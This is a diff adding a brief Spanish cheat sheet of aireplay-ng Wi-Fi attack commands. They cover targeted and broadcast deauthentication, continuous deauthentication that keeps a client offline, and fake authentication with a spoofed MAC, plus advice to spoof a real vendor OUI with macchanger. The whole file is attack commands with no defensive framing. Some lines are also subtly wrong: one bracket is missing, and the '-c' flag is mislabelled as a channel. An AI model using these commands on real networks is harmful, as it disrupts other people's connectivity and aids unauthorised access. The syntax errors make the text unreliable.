@@ -1,0 +1,16 @@
+#Tecnica de Deautenticacion
+aireplay-ng -0 10 -e [Nombredered] -c [Canal] [StationDelCliente] wlan0
+
+#Tecnica de Deautenticacion global
+aireplay-ng -0 10 -e [Nombredered] -c [Canal] FF:FF:FF:FF:FF:FF wlan0
+
+#Es lo mismo pero mas facil de recordar
+aireplay-ng -0 10 -e [Nombredered] wlan0
+
+#Sacas al cliente y no puede conectarse hasta que canceles con CTRL
+aireplay-ng -0 0 -e Nombredered] [StationDelCliente] wlan0
+
+#Tecnica de falsa Autenticacion
+aireplay-ng -1 0 -e [Nombredered] -a [Bssiddelpuntodeacceso] -h [DireccionMacFalsa] wlan0
+
+#Recomiendo macchanger -l y poner un OUI de algun dispositivo vigente en esta lista.
